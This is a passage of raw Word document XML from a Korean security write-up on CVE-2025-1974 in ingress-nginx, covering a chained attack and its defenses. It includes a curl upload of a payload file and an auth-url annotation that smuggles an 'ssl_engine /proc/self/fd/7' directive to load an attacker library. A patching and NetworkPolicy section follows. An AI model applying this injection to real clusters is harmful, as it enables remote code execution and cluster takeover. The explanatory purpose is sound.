          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유출</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가능</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D42B36E" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>연계</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767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CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767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CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시나리오</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CVE-2025-1974 </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>연동</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7049164B" w14:textId="67E16C67" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대용량 요청으로 공유 라이브러리 업로드</w:t>
      </w:r>
      <w:r w:rsidR="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67E8152C" wp14:editId="35974F79">
                <wp:extent cx="5324475" cy="967563"/>
                <wp:effectExtent l="0" t="0" r="28575" b="23495"/>
                <wp:docPr id="107318332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967563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53047" w14:textId="590FA618" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
                            <w:pPr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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7EB0EB01" w14:textId="6FB73C31" w:rsidR="001D6E9D" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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</w:pPr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 xml:space="preserve">dd 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FF0000"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>if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=/dev/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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urandom</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 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FF0000"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>of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=</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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payload.bin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 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FF0000"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>bs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 xml:space="preserve">=1M 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FF0000"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>count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=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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>100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br/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curl -X POST https://victim.com/upload --data-binary @payload.bin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E8152C" id="_x0000_s1037" style="width:419.25pt;height:7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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="73953047" w14:textId="590FA618" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
                      <w:pPr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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7EB0EB01" w14:textId="6FB73C31" w:rsidR="001D6E9D" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr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</w:pPr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 xml:space="preserve">dd </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="FF0000"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>if</w:t>
                      </w:r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=/dev/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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urandom</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="FF0000"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>of</w:t>
                      </w:r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=</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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payload.bin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="FF0000"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>bs</w:t>
                      </w:r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 xml:space="preserve">=1M </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="FF0000"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>count</w:t>
                      </w:r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=</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>100</w:t>
                      </w:r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br/>
                      </w:r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curl -X POST https://victim.com/upload --data-binary @payload.bin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65E7352" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX가 임시 파일로 저장(/var/lib/nginx/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>client_body</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/0000000001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEC9751" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ssl_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>디렉티브</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 주입</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D053B6" w14:textId="573B8877" w:rsidR="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
      <w:pPr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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E6B3BBF" wp14:editId="52DFFC28">
                <wp:extent cx="5324475" cy="967563"/>
                <wp:effectExtent l="0" t="0" r="28575" b="23495"/>
                <wp:docPr id="113291850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967563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5C323" w14:textId="77197AFD" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00D51C89" w:rsidP="00CF2767">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2FCBDED9" w14:textId="683540F7" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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</w:pPr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nginx.ingress.kubernetes.io/auth-url: "http://legit.com/;#\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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nssl_engine</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidR="00D51C89"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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r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/proc/self/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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fd</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767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/7;"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6B3BBF" id="_x0000_s1038" style="width:419.25pt;height:7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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3B75C323" w14:textId="77197AFD" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00D51C89" w:rsidP="00CF2767">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2FCBDED9" w14:textId="683540F7" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr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</w:pPr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nginx.ingress.kubernetes.io/auth-url: "http://legit.com/;#\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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nssl_engine</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidR="00D51C89">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r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/proc/self/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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fd</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767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/7;"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B66EAE8" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/proc 파일 시스템을 통해 임시 파일 접근</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A3D400" w14:textId="1909B987" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원격 코드 실행</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCB39FA" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>주입된</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>라이브러리가</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>프로세스</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>컨텍스트에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행되어</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>전체</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>장악</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F144D24" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D9CFABC" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="266579CB" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="377D1ED4" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A7EEB25" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54F7ACA7" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A418828" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B0A24A" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E5E2524" w14:textId="3F1159D9" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕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lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>방어 메커니즘</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464AD8CE" w14:textId="2287DF85" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치 적용</w:t>
      </w:r>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: v1.11.5/v1.12.1 이상 업그레이</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>드</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406C292F" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="82"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D51C89">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 접근 제한</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31513BD9" w14:textId="4D9DA0FB" w:rsidR="00D51C89" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3335A436" wp14:editId="46C7E50F">
                <wp:extent cx="5324475" cy="4890977"/>
                <wp:effectExtent l="0" t="0" r="28575" b="24130"/>
                <wp:docPr id="143286593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4890977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231B6" w14:textId="77777777" w:rsidR="00D51C89" w:rsidRPr="001D6E9D" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="727A01A2" w14:textId="23A65278" w:rsidR="00D51C89" w:rsidRPr="00CF2767" w:rsidRDefault="00D51C89" w:rsidP="00D51C89">
                            <w:pPr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</w:pPr>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve"># </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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NetworkPolicy</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89"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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>정의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br/>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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apiVersion</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00D51C89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: networking.k8s.io/v1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br/>
                            </w:r>
                            <w:r w:rsidRPr="00D51C89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 xml:space="preserve">kind: </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00D51C89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NetworkPolicy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br/>
